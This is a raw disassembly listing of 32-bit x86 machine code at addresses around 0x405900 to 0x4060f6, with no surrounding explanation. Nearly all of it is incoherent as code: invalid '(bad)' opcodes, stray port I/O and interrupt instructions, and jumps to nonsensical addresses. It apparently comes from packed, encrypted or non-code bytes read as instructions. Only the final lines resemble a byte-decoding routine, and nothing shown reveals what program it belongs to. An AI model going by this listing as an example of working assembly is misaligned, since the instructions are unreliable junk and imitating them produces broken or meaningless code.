  40593e:	std    
  40593f:	jnp    0x405938
  405941:	mov    ds:0xee95920a,al
  405946:	jl     0x405997
  405948:	jg     0x4058fd
  40594a:	in     al,0xd9
  40594c:	mov    ebp,0xf3dc1633
  405951:	xor    esi,DWORD PTR [ebx]
  405953:	ret    
  405954:	stos   BYTE PTR es:[edi],al
  405955:	int    0xe0
  405957:	inc    esi
  405958:	popa   
  405959:	push   cs
  40595a:	xchg   ebx,eax
  40595b:	jnp    0x40598f
  40595d:	xchg   esp,eax
  40595e:	sbb    ebp,0xffffffb0
  405961:	jae    0x4059b8
  405963:	jnp    0x40591b
  405965:	ret    
  405966:	data16 into 
  405968:	or     al,0xa0
  40596a:	xchg   BYTE PTR [ebp-0x74],bl
  40596d:	xchg   ebx,eax
  40596e:	and    edx,DWORD PTR [ebx+ecx*2]
  405971:	mov    bl,cl
  405973:	js     0x40590f
  405975:	push   edi
  405976:	dec    ecx
  405977:	xor    ebp,0xffffff9d
  40597a:	inc    ecx
  40597b:	push   cs
  40597c:	test   eax,0xc306bd34
  405981:	inc    edi
  405982:	push   0x378ced35
  405987:	xchg   edi,eax
  405988:	in     al,dx
  405989:	adc    cl,BYTE PTR gs:[esi+0x1179afaf]
  405990:	dec    edx
  405991:	mov    esp,0xd1ebb64e
  405996:	scas   eax,DWORD PTR es:[edi]
  405997:	sbb    eax,0xdaec5b3f
  40599c:	cwde   
  40599d:	and    DWORD PTR [edi],edx
  40599f:	mov    esi,0x8dc74361
  4059a4:	jmp    FWORD PTR [ebp+0x284a8efd]
  4059aa:	out    0xe4,eax
  4059ac:	lock jp 0x4059e8
  4059af:	and    dl,bl
  4059b1:	js     0x40596e
  4059b3:	iret   
  4059b4:	shr    DWORD PTR [ebx-0x7105817f],0xda
  4059bb:	ins    BYTE PTR es:[edi],dx
  4059bc:	inc    ebx
  4059bd:	inc    ebp
  4059be:	sub    esi,DWORD PTR [ecx]
  4059c0:	ins    DWORD PTR es:[edi],dx
  4059c1:	dec    esp
  4059c2:	inc    edi
  4059c3:	es std 
  4059c5:	(bad)  
  4059c6:	icebp  
  4059c7:	arpl   WORD PTR [esi-0x20],bx
  4059ca:	xor    eax,0xb97c044
  4059cf:	outs   dx,DWORD PTR ds:[esi]
  4059d0:	fdivr  DWORD PTR [eax-0x36c9456f]
  4059d6:	mov    al,0x9c
  4059d8:	(bad)  [ecx]
  4059da:	dec    edi
  4059db:	mov    dl,0x75
  4059dd:	inc    ebx
  4059de:	xchg   edx,eax
  4059df:	fisttp QWORD PTR [eax+0x78]
  4059e2:	sub    DWORD PTR [esi],ecx
  4059e4:	out    0xf7,al
  4059e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e7:	jl     0x4059ba
  4059e9:	jp     0x4059f6
  4059eb:	outs   dx,DWORD PTR ds:[esi]
  4059ec:	or     eax,0x3da4d99b
  4059f1:	fsub   st,st(1)
  4059f3:	into   
  4059f4:	sbb    bl,BYTE PTR [eax+0x53]
  4059f7:	bound  ecx,QWORD PTR [ebx]
  4059f9:	mov    bh,0xb5
  4059fb:	xor    eax,0xf8a4c7e7
  405a00:	loopne 0x405a69
  405a02:	sbb    al,0xb0
  405a04:	ss fcmove st,st(4)
  405a07:	dec    ebx
  405a08:	loope  0x4059e7
  405a0a:	push   esi
  405a0b:	jne    0x405a87
  405a0d:	rcl    ch,cl
  405a0f:	mov    eax,0x73562848
  405a14:	test   eax,0x55e24188
  405a19:	cmp    DWORD PTR [edi+0x49c3c4da],edi
  405a1f:	push   ebp
  405a20:	cmp    al,0x71
  405a22:	sub    al,0x4c
  405a24:	dec    edi
  405a25:	stc    
  405a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a27:	inc    edx
  405a28:	enter  0x957a,0x3b
  405a2c:	data16 jo 0x405a14
  405a2f:	lods   eax,DWORD PTR ds:[esi]
  405a30:	daa    
  405a31:	fidiv  DWORD PTR [ebp-0x54d52797]
  405a37:	inc    esp
  405a38:	xor    al,BYTE PTR [eax+0x7e53c809]
  405a3e:	inc    edx
  405a3f:	lods   eax,DWORD PTR ds:[esi]
  405a40:	cdq    
  405a41:	or     eax,0x49cbf83e
  405a46:	mov    dl,0xde
  405a48:	jp     0x405a53
  405a4a:	jp     0x405a6f
  405a4c:	adc    al,0xbb
  405a4e:	push   esi
  405a4f:	dec    esi
  405a50:	xor    edx,edx
  405a52:	std    
  405a53:	jge    0x4059f7
  405a55:	dec    edx
  405a56:	inc    esp
  405a57:	sbb    al,0xe3
  405a59:	adc    DWORD PTR [ebp+ebp*1+0x63],esi
  405a5d:	inc    ecx
  405a5e:	pop    esp
  405a5f:	cwde   
  405a60:	cld    
  405a61:	or     ebp,DWORD PTR [ecx+0x6707550b]
  405a67:	push   ebx
  405a68:	mov    ebp,0xe2d687fa
  405a6d:	mov    al,0x66
  405a6f:	enter  0x4695,0xae
  405a73:	mov    ebp,0xbb81f0be
  405a78:	xchg   ecx,eax
  405a79:	adc    al,0x16
  405a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a7c:	mov    gs,WORD PTR [eax]
  405a7e:	pop    eax
  405a7f:	fsubr  st,st(7)
  405a81:	mov    ds:0x4ef7300a,al
  405a86:	jne    0x405af1
  405a88:	or     edi,DWORD PTR [ebx+ebx*1]
  405a8b:	fwait
  405a8c:	inc    ebp
  405a8d:	pusha  
  405a8e:	and    al,0xb5
  405a90:	aaa    
  405a91:	jecxz  0x405a6a
  405a93:	out    dx,al
  405a94:	add    eax,DWORD PTR [esi+eiz*2-0x4b]
  405a98:	add    eax,0xcbe38b34
  405a9d:	push   edx
  405a9e:	gs clc 
  405aa0:	(bad)  
  405aa1:	pop    ebp
  405aa2:	loop   0x405a66
  405aa4:	cwde   
  405aa5:	in     al,dx
  405aa6:	dec    ebp
  405aa7:	xor    al,0x9a
  405aa9:	inc    esi
  405aaa:	sbb    ecx,edx
  405aac:	cmp    BYTE PTR [edx+0x1e0835f0],al
  405ab2:	and    esp,DWORD PTR [ecx+0x67]
  405ab5:	int    0x1f
  405ab7:	clc    
  405ab8:	push   esi
  405ab9:	inc    esp
  405aba:	ja     0x405a42
  405abc:	adc    eax,0xe5c51287
  405ac1:	and    al,0x2b
  405ac3:	adc    BYTE PTR ds:0x995eb1f8,dl
  405ac9:	jg     0x405a59
  405acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405acc:	dec    ecx
  405acd:	and    al,0xd9
  405acf:	scas   eax,DWORD PTR es:[edi]
  405ad0:	inc    esi
  405ad1:	jle    0x405a6c
  405ad3:	inc    ebp
  405ad4:	jb     0x405b4e
  405ad6:	lock lds edi,FWORD PTR ds:0xda1da0a2
  405add:	ins    BYTE PTR es:[edi],dx
  405ade:	push   0xffffffe4
  405ae0:	bound  ecx,QWORD PTR [eax]
  405ae2:	mov    ebp,0x967be52d
  405ae7:	xor    ecx,edi
  405ae9:	push   esi
  405aea:	dec    BYTE PTR [ebx-0x23846c0f]
  405af0:	add    BYTE PTR [esi+0x5ebd3146],dl
  405af6:	inc    ebx
  405af7:	adc    BYTE PTR [edx+esi*4],bh
  405afa:	dec    edx
  405afb:	mov    edi,0x4b08b715
  405b00:	jno    0x405b1e
  405b02:	sbb    al,0xa2
  405b04:	stos   DWORD PTR es:[edi],eax
  405b05:	and    DWORD PTR [ecx],ebp
  405b07:	push   esp
  405b08:	cmp    dh,BYTE PTR [eax]
  405b0a:	arpl   WORD PTR [ecx],dx
  405b0c:	fcomp  DWORD PTR [ebp+0x4567c803]
  405b12:	addr16 dec eax
  405b14:	out    dx,al
  405b15:	adc    BYTE PTR [eax-0x79dc1f44],dl
  405b1b:	xchg   ebx,eax
  405b1c:	fcom   st(5)
  405b1e:	in     al,dx
  405b1f:	sbb    eax,0x24331bcc
  405b24:	fldcw  WORD PTR [eax+0x3a439ec5]
  405b2a:	es scas eax,DWORD PTR es:[edi]
  405b2c:	and    BYTE PTR [ebp-0x476f3327],cl
  405b32:	or     al,0x13
  405b34:	pop    ds
  405b35:	sbb    edx,edx
  405b37:	mov    dl,0xdc
  405b39:	push   0xebe94c40
  405b3e:	mov    esp,0x7f0c6871
  405b43:	pop    es
  405b44:	call   0x9373e09b
  405b49:	jmp    0x7a2e455e
  405b4e:	mov    al,ds:0xde55fa75
  405b53:	push   edx
  405b54:	shr    DWORD PTR [ecx-0x52],cl
  405b57:	jp     0x405ae4
  405b59:	add    BYTE PTR [eax-0x44375b2a],ch
  405b5f:	clc    
  405b60:	fwait
  405b61:	inc    esi
  405b62:	jle    0x405bae
  405b64:	jmp    0x405bcc
  405b66:	dec    eax
  405b67:	xchg   ch,bh
  405b69:	push   ss
  405b6a:	adc    al,0x29
  405b6c:	shr    ebp,cl
  405b6e:	shr    BYTE PTR [edi],cl
  405b70:	mov    ebp,0x8955ca1e
  405b75:	xchg   edx,eax
  405b76:	push   esp
  405b77:	stc    
  405b78:	les    ebp,FWORD PTR [eax-0x43]
  405b7b:	mov    gs,WORD PTR [ebx+ebp*8-0x2a]
  405b7f:	loop   0x405b84
  405b81:	mov    DWORD PTR [edx+0x9],esi
  405b84:	mov    dl,0x6d
  405b86:	daa    
  405b87:	mov    esp,0xa99e8697
  405b8c:	or     bl,0xbe
  405b8f:	mov    dl,0xb7
  405b91:	dec    ecx
  405b92:	popa   
  405b93:	loop   0x405bb2
  405b95:	inc    edi
  405b96:	mov    BYTE PTR [edi],ah
  405b98:	cmp    al,0x32
  405b9a:	int3   
  405b9b:	jns    0x405ba7
  405b9d:	cmp    bl,0x5f
  405ba0:	dec    esp
  405ba1:	test   eax,0x50826c8b
  405ba6:	pop    edx
  405ba7:	out    0x51,al
  405ba9:	jp     0x405b4f
  405bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bac:	sbb    bh,BYTE PTR [ebx+0x19]
  405baf:	jecxz  0x405b7e
  405bb1:	xchg   edi,eax
  405bb2:	scas   al,BYTE PTR es:[edi]
  405bb3:	int    0x3f
  405bb5:	stos   BYTE PTR es:[edi],al
  405bb6:	fwait
  405bb7:	inc    eax
  405bb8:	mov    ch,0xbe
  405bba:	js     0x405bec
  405bbc:	cmp    ebx,edi
  405bbe:	adc    eax,0x29d36910
  405bc3:	shl    BYTE PTR [ebp+esi*8-0x63],cl
  405bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc8:	mov    ds:0x57c53e36,al
  405bcd:	xchg   BYTE PTR [ebx+0x70af05ee],ch
  405bd3:	cs xchg edi,eax
  405bd5:	les    ecx,FWORD PTR [ecx]
  405bd7:	or     DWORD PTR [eax+0x2068d2d7],esi
  405bdd:	mov    al,0x6
  405bdf:	dec    ebp
  405be0:	xchg   ecx,eax
  405be1:	xchg   esp,eax
  405be2:	mov    ch,0xe6
  405be4:	mov    esp,0xdea78872
  405be9:	arpl   WORD PTR [eax-0x2],dx
  405bec:	jmp    0x405c0a
  405bee:	and    eax,0xac9d8c2
  405bf3:	dec    esi
  405bf4:	mov    dl,0xe8
  405bf6:	sbb    DWORD PTR [ecx+0x1e9eb16f],esp
  405bfc:	in     eax,0xa9
  405bfe:	pop    ecx
  405bff:	add    DWORD PTR [ebp-0x5d134e2a],0x9e3f4e48
  405c09:	aaa    
  405c0a:	(bad)  
  405c0b:	outs   dx,DWORD PTR ds:[esi]
  405c0c:	iret   
  405c0d:	cmp    DWORD PTR [edx-0x7a1f78e9],ecx
  405c13:	scas   eax,DWORD PTR es:[edi]
  405c14:	mov    al,0xe1
  405c16:	push   ds
  405c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c18:	mov    al,0xda
  405c1a:	push   esi
  405c1b:	aad    0xf1
  405c1d:	mov    ch,0xda
  405c1f:	jp     0x405c37
  405c21:	stc    
  405c22:	popf   
  405c23:	xor    bh,BYTE PTR [eax+ebp*1-0x4b]
  405c27:	or     ecx,DWORD PTR [edx+0x3a4832b4]
  405c2d:	test   DWORD PTR [edi+0x45],edx
  405c30:	das    
  405c31:	sub    eax,0x3b07c423
  405c36:	fwait
  405c37:	jae    0x405c3d
  405c39:	pop    ecx
  405c3a:	adc    DWORD PTR [eax],esp
  405c3c:	mov    cl,0xff
  405c3e:	inc    edx
  405c3f:	adc    DWORD PTR [eax+0x60],edi
  405c42:	rcl    BYTE PTR [eax-0x3f1b5c61],1
  405c48:	fs cld 
  405c4a:	add    al,0xe0
  405c4c:	cdq    
  405c4d:	mov    al,ds:0xfb32e782
  405c52:	int3   
  405c53:	jp     0x405bdf
  405c55:	add    eax,0x5bab9093
  405c5a:	pop    edx
  405c5b:	mov    edx,esi
  405c5d:	sub    dh,BYTE PTR [eax+eiz*8-0x4c]
  405c61:	mov    ah,0x1a
  405c63:	fst    QWORD PTR [esi]
  405c65:	int3   
  405c66:	cwde   
  405c67:	loope  0x405caa
  405c69:	outs   dx,DWORD PTR ds:[esi]
  405c6a:	mov    WORD PTR [edx+0x4a],ds
  405c6d:	nop
  405c6e:	pop    ebx
  405c6f:	sub    edi,esp
  405c71:	hlt    
  405c72:	sbb    ebx,edi
  405c74:	(bad)  
  405c75:	repz imul edx,DWORD PTR [edx-0x5c],0x5ed184c9
  405c7d:	dec    edi
  405c7e:	test   eax,0xf6cc447d
  405c83:	fsubr  DWORD PTR [ecx+ebp*1+0x69d6e9c]
  405c8a:	bound  ebp,QWORD PTR [ecx-0x11]
  405c8d:	push   ss
  405c8e:	call   0x36b8351c
  405c93:	add    DWORD PTR ds:0xa0e3a5b9,edi
  405c99:	stc    
  405c9a:	pop    eax
  405c9b:	test   BYTE PTR [eax],ch
  405c9d:	jmp    0x405c41
  405c9f:	enter  0x1cfb,0x7d
  405ca3:	ins    DWORD PTR es:[edi],dx
  405ca4:	cmp    al,bh
  405ca6:	cmc    
  405ca7:	hlt    
  405ca8:	sbb    BYTE PTR [edi+0x6],ah
  405cab:	add    al,0x3a
  405cad:	inc    ebp
  405cae:	int    0x99
  405cb0:	cmp    DWORD PTR [eax-0x70],eax
  405cb3:	cmp    bl,BYTE PTR [eax+edi*8]
  405cb6:	ins    BYTE PTR es:[edi],dx
  405cb7:	jbe    0x405cc1
  405cb9:	xchg   ecx,eax
  405cba:	jmp    0x9bc:0x6654fda9
  405cc1:	mov    dh,0xe1
  405cc3:	aad    0x33
  405cc5:	retf   
  405cc6:	push   0x273fc473
  405ccb:	nop
  405ccc:	sbb    edi,DWORD PTR [eax-0x67b48a6]
  405cd2:	jbe    0x405c60
  405cd4:	adc    al,0xd6
  405cd6:	xor    eax,DWORD PTR [esp+ebx*4]
  405cd9:	or     eax,0x88e56fd6
  405cde:	test   eax,0xb1ad9d0c
  405ce3:	xor    DWORD PTR [eax+0x173d04c],edx
  405ce9:	mov    al,ds:0x60ed3054
  405cee:	stos   DWORD PTR es:[edi],eax
  405cef:	mov    esi,0x1e9378b1
  405cf4:	ret    
  405cf5:	mov    edx,0x4ef1780
  405cfa:	add    BYTE PTR [edi-0x9],dl
  405cfd:	or     ch,BYTE PTR [ebp+0x402b932b]
  405d03:	sbb    al,BYTE PTR [esi-0x44]
  405d06:	xlat   BYTE PTR ds:[ebx]
  405d07:	cmp    eax,0x7f31ec3e
  405d0c:	dec    eax
  405d0d:	dec    eax
  405d0e:	fsubrp st(6),st
  405d10:	adc    BYTE PTR [eax+0x7a523267],0xdb
  405d17:	shl    BYTE PTR [ebp-0x4632a0cc],0x6a
  405d1e:	xchg   edx,eax
  405d1f:	in     eax,0x8b
  405d21:	neg    BYTE PTR [esi]
  405d23:	popa   
  405d24:	enter  0x730d,0x47
  405d28:	fcmovnbe st,st(4)
  405d2a:	jae    0x405d33
  405d2c:	inc    eax
  405d2d:	mov    dl,0x3
  405d2f:	cwde   
  405d30:	and    al,0x4
  405d32:	xlat   BYTE PTR ds:[ebx]
  405d33:	jae    0x405cbf
  405d35:	inc    esi
  405d36:	xchg   BYTE PTR [edx+0x7a],al
  405d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d3a:	xchg   ebp,eax
  405d3b:	xchg   esi,eax
  405d3c:	les    ebx,FWORD PTR [edx+0x10cf676]
  405d42:	push   esp
  405d43:	adc    BYTE PTR [esi],ah
  405d45:	push   ss
  405d46:	add    DWORD PTR [eax-0x6e],esi
  405d49:	or     edi,ebp
  405d4b:	mov    dl,0xdc
  405d4d:	pop    ecx
  405d4e:	jge    0x405d6d
  405d50:	loopne 0x405d5a
  405d52:	retf   
  405d53:	mov    dl,0xf1
  405d55:	mov    ds:0x57d05230,al
  405d5a:	shl    esp,1
  405d5c:	cdq    
  405d5d:	fistp  DWORD PTR [edi]
  405d5f:	add    bh,BYTE PTR [ecx+0x2af399b2]
  405d65:	xlat   BYTE PTR fs:[ebx]
  405d67:	adc    al,al
  405d69:	mov    ecx,ecx
  405d6b:	jmp    0xd55b172f
  405d70:	push   ds
  405d71:	retf   
  405d72:	xchg   edx,eax
  405d73:	mov    ch,0xe4
  405d75:	sahf   
  405d76:	jmp    0xddf6:0xa8696e41
  405d7d:	imul   esp,DWORD PTR [edi+0x299fec0a],0x18020c37
  405d87:	inc    edx
  405d88:	push   ds
  405d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8a:	add    BYTE PTR es:[esi+0x7e],0x5f
  405d8f:	cmc    
  405d90:	push   ecx
  405d91:	bswap  esi
  405d93:	and    al,0x64
  405d95:	mov    al,ds:0xa7f8fd19
  405d9a:	push   ebx
  405d9b:	scas   al,BYTE PTR es:[edi]
  405d9c:	das    
  405d9d:	stc    
  405d9e:	xchg   edx,eax
  405d9f:	fdiv   QWORD PTR [edi+ecx*1-0x5c23a1e5]
  405da6:	or     eax,0xffffff99
  405da9:	push   esp
  405daa:	scas   al,BYTE PTR es:[edi]
  405dab:	xchg   ebx,eax
  405dac:	adc    ebx,DWORD PTR [edx+0x25]
  405daf:	popf   
  405db0:	push   esp
  405db1:	push   eax
  405db2:	std    
  405db3:	jo     0x405d81
  405db5:	inc    edi
  405db6:	loope  0x405ddc
  405db8:	mov    ?,ebp
  405dba:	shr    DWORD PTR [edi],1
  405dbc:	daa    
  405dbd:	lock lods eax,DWORD PTR ds:[esi]
  405dbf:	dec    ebx
  405dc0:	imul   eax,DWORD PTR [esi-0x44506962],0xbdd1adc4
  405dca:	pop    ecx
  405dcb:	sbb    eax,0xf204c7a2
  405dd0:	cmp    DWORD PTR [edx+0x68f00c5a],ecx
  405dd6:	cld    
  405dd7:	jl     0x405e16
  405dd9:	jno    0x405d6f
  405ddb:	adc    ah,bh
  405ddd:	dec    ebp
  405dde:	mov    ds:0x57a152a,al
  405de3:	sub    bh,BYTE PTR [esi-0x2c]
  405de6:	xor    DWORD PTR [ebx-0x5d],eax
  405de9:	mov    cl,0x10
  405deb:	adc    DWORD PTR [eax+0x5a],0x996c9f67
  405df2:	push   ebx
  405df3:	pop    esp
  405df4:	bound  esi,QWORD PTR [ecx+0x27]
  405df7:	call   0xf451:0xd0656367
  405dfe:	ret    
  405dff:	les    ecx,FWORD PTR [ecx+0x67]
  405e02:	loopne 0x405e0d
  405e04:	jbe    0x405e22
  405e06:	xchg   ebx,eax
  405e07:	mov    ?,WORD PTR [edi-0x4b1ef8ac]
  405e0d:	inc    edx
  405e0e:	and    al,0x9d
  405e10:	jg     0x405e29
  405e12:	lock loopne 0x405dce
  405e15:	mov    dl,0xcf
  405e17:	fstp   QWORD PTR [eax-0x7280b037]
  405e1d:	sti    
  405e1e:	sbb    eax,0x50ddb5de
  405e23:	call   0x5f33b0dc
  405e28:	add    dh,BYTE PTR [eax]
  405e2a:	xlat   BYTE PTR ds:[ebx]
  405e2b:	pop    ds
  405e2c:	hlt    
  405e2d:	jle    0x405e61
  405e2f:	jno    0x405e0e
  405e31:	xchg   edi,eax
  405e32:	dec    esp
  405e33:	lods   al,BYTE PTR ds:[esi]
  405e34:	add    BYTE PTR [edi+0x7f53ba41],0xaa
  405e3b:	adc    BYTE PTR [edx+0x3f],dl
  405e3e:	push   ds
  405e3f:	jl     0x405e22
  405e41:	test   eax,0x589c11b4
  405e46:	inc    edi
  405e47:	pop    ecx
  405e48:	repnz xchg ebx,eax
  405e4a:	loopne 0x405e49
  405e4c:	xor    esp,DWORD PTR [ebx-0x44]
  405e4f:	iret   
  405e50:	xor    eax,0xf10db57e
  405e55:	xor    ecx,DWORD PTR [ebx]
  405e57:	pop    ds
  405e58:	mov    ds:0x1ed5c4e7,al
  405e5d:	push   ss
  405e5e:	inc    edi
  405e5f:	data16 and ch,BYTE PTR [ebp+0x2db040c3]
  405e66:	dec    esi
  405e67:	push   esi
  405e68:	push   ds
  405e69:	mov    bl,0xe0
  405e6b:	mov    ch,0x10
  405e6d:	jmp    0x7a05:0x21528582
  405e74:	outs   dx,DWORD PTR ds:[esi]
  405e75:	xchg   BYTE PTR [esi-0x49],cl
  405e78:	outs   dx,DWORD PTR ds:[esi]
  405e79:	mov    edx,0xe313a7f6
  405e7e:	mov    BYTE PTR [ecx+ebx*8-0x17],bh
  405e82:	mov    cl,BYTE PTR [esi]
  405e84:	add    ecx,ebp
  405e86:	jmp    0xccb870f9
  405e8b:	jnp    0x405e26
  405e8d:	push   es
  405e8e:	in     eax,dx
  405e8f:	jno    0x405ebc
  405e91:	out    dx,eax
  405e92:	test   DWORD PTR [edx-0x2feda75c],edx
  405e98:	out    0xa,al
  405e9a:	test   eax,0xf80c0c22
  405e9f:	mov    ebp,0x6e557711
  405ea4:	or     dh,BYTE PTR ds:0x2512300f
  405eaa:	inc    edx
  405eab:	popa   
  405eac:	sbb    ah,al
  405eae:	adc    BYTE PTR [ecx-0x14],dh
  405eb1:	sub    al,0x1b
  405eb3:	cmp    esp,0xffffff80
  405eb6:	out    0x4b,eax
  405eb8:	sbb    BYTE PTR [ecx+0x6c41386b],0x48
  405ebf:	or     BYTE PTR [edi+0x710460b3],dl
  405ec5:	sbb    eax,0x67bf02f4
  405eca:	sub    BYTE PTR cs:[ecx+edx*4],al
  405ece:	jecxz  0x405e6f
  405ed0:	cmp    cl,BYTE PTR [esi]
  405ed2:	ins    DWORD PTR es:[edi],dx
  405ed3:	sbb    eax,0x218bdebd
  405ed8:	mov    esi,0xc093dc6b
  405edd:	call   edi
  405edf:	and    ebx,DWORD PTR [edx+edi*1]
  405ee2:	fbstp  TBYTE PTR [eax+0x5b]
  405ee5:	(bad)  
  405ee6:	sub    eax,0x79466dcc
  405eeb:	jle    0x405ed5
  405eed:	dec    eax
  405eee:	push   ebx
  405eef:	xor    edx,DWORD PTR [ebx+edx*1+0x21]
  405ef3:	sbb    edx,DWORD PTR [esi-0x61c2b8fc]
  405ef9:	xor    BYTE PTR [eax-0x77],bl
  405efc:	jmp    DWORD PTR ds:0x6984890f
  405f02:	xor    esi,ebp
  405f04:	les    edi,FWORD PTR [esi+0x51269abf]
  405f0a:	mov    edx,0x6d6db16f
  405f0f:	mov    eax,ds:0x941ff595
  405f14:	adc    al,cl
  405f16:	cli    
  405f17:	xchg   ecx,eax
  405f18:	leave  
  405f19:	xchg   esi,eax
  405f1a:	fsub   DWORD PTR [ebx]
  405f1c:	repnz sub BYTE PTR [edi],bl
  405f1f:	pop    edi
  405f20:	pop    edx
  405f21:	push   edx
  405f22:	leave  
  405f23:	push   ds
  405f24:	or     esi,DWORD PTR [eax-0x2c8525f0]
  405f2a:	pop    ebp
  405f2b:	adc    BYTE PTR [edx-0x7a4e8559],bl
  405f31:	iret   
  405f32:	hlt    
  405f33:	cmp    BYTE PTR [edi+ebx*2-0x3eb617ff],bh
  405f3a:	sbb    BYTE PTR ds:0x8018,0xda
  405f40:	mul    DWORD PTR ds:0xb76e8a8c
  405f46:	lock popf 
  405f48:	(bad)  
  405f49:	pop    ecx
  405f4a:	data16 sbb BYTE PTR [edx+0x58],bh
  405f4e:	call   0x6489edfe
  405f53:	xor    ebx,DWORD PTR [ebx-0x3edb2ee]
  405f59:	mov    eax,DWORD PTR [ecx+edi*8+0x7efc432e]
  405f60:	or     bh,al
  405f62:	mov    eax,0xbc4d882b
  405f67:	mov    al,ds:0xacfa364f
  405f6c:	mov    ebp,0x17504fe9
  405f71:	xchg   ebp,eax
  405f72:	rcl    DWORD PTR [ebp-0x4a],cl
  405f75:	cmp    DWORD PTR [edi+0x1615f80d],ebp
  405f7b:	mov    eax,ds:0xf4377829
  405f80:	push   es
  405f81:	push   0x30
  405f83:	stc    
  405f84:	cmp    eax,0xb094cd3
  405f89:	rcr    BYTE PTR [edx],cl
  405f8b:	imul   esi,DWORD PTR [ecx+eiz*1+0x702d17f],0x5f
  405f93:	mov    eax,ds:0x5baca273
  405f98:	into   
  405f99:	repnz sbb ebx,DWORD PTR [eax-0x705862bb]
  405fa0:	sbb    DWORD PTR [eax],0x628d4dca
  405fa6:	int3   
  405fa7:	jecxz  0x405fca
  405fa9:	aaa    
  405faa:	popf   
  405fab:	push   es
  405fac:	cs ror ah,cl
  405faf:	ret    0x72f
  405fb2:	(bad)  
  405fb3:	popf   
  405fb4:	xchg   edi,eax
  405fb5:	or     eax,0x6ed4df9c
  405fba:	shr    cl,0x2b
  405fbd:	xor    BYTE PTR [eax-0x1f],ah
  405fc0:	fxch   st(2)
  405fc2:	fcmove st,st(7)
  405fc4:	das    
  405fc5:	sub    DWORD PTR [esi+0x9],esi
  405fc8:	jns    0x405f93
  405fca:	dec    eax
  405fcb:	fild   WORD PTR [ebx]
  405fcd:	call   0xe96715db
  405fd2:	lock pop edx
  405fd4:	mov    dh,0x74
  405fd6:	or     al,0xb7
  405fd8:	mov    ch,0xf7
  405fda:	hlt    
  405fdb:	idiv   DWORD PTR [esi]
  405fdd:	pushf  
  405fde:	int    0x82
  405fe0:	cmp    eax,0x7572a6a
  405fe5:	shl    cl,0xd3
  405fe8:	or     dh,BYTE PTR ds:0x4bcdf8a7
  405fee:	addr16 pop edi
  405ff0:	pop    edi
  405ff1:	out    dx,al
  405ff2:	(bad)  
  405ff4:	(bad)  
  405ff6:	and    ch,BYTE PTR [ecx+0x26]
  405ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ffa:	xlat   BYTE PTR ds:[ebx]
  405ffb:	push   esi
  405ffc:	push   edx
  405ffd:	cli    
  405ffe:	(bad)  
  405fff:	cwde   
  406000:	arpl   WORD PTR [esi],di
  406002:	inc    eax
  406003:	mov    edx,0x7afee02c
  406008:	icebp  
  406009:	(bad)  
  40600a:	call   0x9fe4d1d2
  40600f:	mov    eax,0x3595a550
  406014:	inc    ebx
  406015:	rcr    bh,1
  406017:	fsubp  st(0),st
  406019:	popf   
  40601a:	mov    al,ds:0xb53c7f0e
  40601f:	sub    BYTE PTR [edx-0x151d762e],bh
  406025:	add    al,0xf6
  406027:	into   
  406028:	loop   0x406044
  40602a:	adc    BYTE PTR [edx-0x7b534775],cl
  406030:	xor    edi,DWORD PTR [ebx]
  406032:	sub    cl,BYTE PTR [esp+eax*2-0x2114b7ae]
  406039:	mov    edi,DWORD PTR [esi-0xc]
  40603c:	mul    DWORD PTR [ebx+0x49ad028d]
  406042:	push   ebp
  406043:	xchg   edi,eax
  406044:	nop
  406045:	stc    
  406046:	push   cs
  406047:	pop    edi
  406048:	popf   
  406049:	adc    al,0x37
  40604b:	pop    esi
  40604c:	shr    BYTE PTR [ecx],cl
  40604e:	test   BYTE PTR [esi],ah
  406050:	ds out dx,eax
  406052:	inc    edi
  406053:	and    cl,bl
  406055:	inc    ecx
  406056:	lea    esp,ds:[edi+0x4ca485d4]
  40605d:	call   FWORD PTR [ecx+0x5a]
  406060:	cli    
  406061:	inc    ebp
  406062:	(bad)  
  406063:	aam    0x10
  406065:	ret    
  406066:	push   ds
  406067:	ds inc ebp
  406069:	js     0x40602d
  40606b:	lahf   
  40606c:	into   
  40606d:	sub    edx,DWORD PTR [esi-0x2c]
  406070:	in     al,0x63
  406072:	(bad)  
  406073:	push   cs
  406074:	std    
  406075:	in     al,dx
  406076:	aaa    
  406077:	and    eax,0x977ccb6
  40607c:	pop    ss
  40607d:	lock jo 0x40605c
  406080:	stos   DWORD PTR es:[edi],eax
  406081:	inc    ecx
  406082:	popa   
  406083:	push   0x3d
  406085:	pop    es
  406086:	ret    0x1eed
  406089:	retfw  0xe845
  40608d:	pop    esi
  40608e:	jae    0x40610b
  406090:	rcl    BYTE PTR [ecx+0x3d],1
  406093:	adc    esp,DWORD PTR [esp+ebx*8]
  406096:	gs dec edx
  406098:	jae    0x40608e
  40609a:	les    esp,FWORD PTR ds:0xd8a5666a
  4060a0:	push   eax
  4060a1:	sub    edi,DWORD PTR [eax-0x313d2002]
  4060a7:	outs   dx,DWORD PTR ds:[esi]
  4060a8:	int    0xce
  4060aa:	mov    BYTE PTR [ebx-0x49],bl
  4060ad:	loop   0x4060d3
  4060af:	or     ch,BYTE PTR [ebx+0x7b1d9230]
  4060b5:	and    BYTE PTR [esi-0x5f],dl
  4060b8:	rcr    BYTE PTR [esi+0x6adda234],0xc5
  4060bf:	adc    dl,BYTE PTR [esp+esi*2+0x24f6275a]
  4060c6:	or     eax,0x8bf13fdb
  4060cb:	push   ebp
  4060cc:	hlt    
  4060cd:	xor    eax,esi
  4060cf:	add    eax,edi
  4060d1:	imul   eax,edx
  4060d4:	mov    edx,DWORD PTR [ebp-0x28]
  4060d7:	xor    edx,esi
  4060d9:	add    eax,edx
  4060db:	mov    edx,DWORD PTR [ebp-0x8]
  4060de:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  4060e6:	mov    edx,DWORD PTR [ebp-0x50]
  4060e9:	xor    edx,esi
  4060eb:	lea    eax,[edx+eax*1+0x3272f8]
  4060f2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060f6:	xor    edx,eax
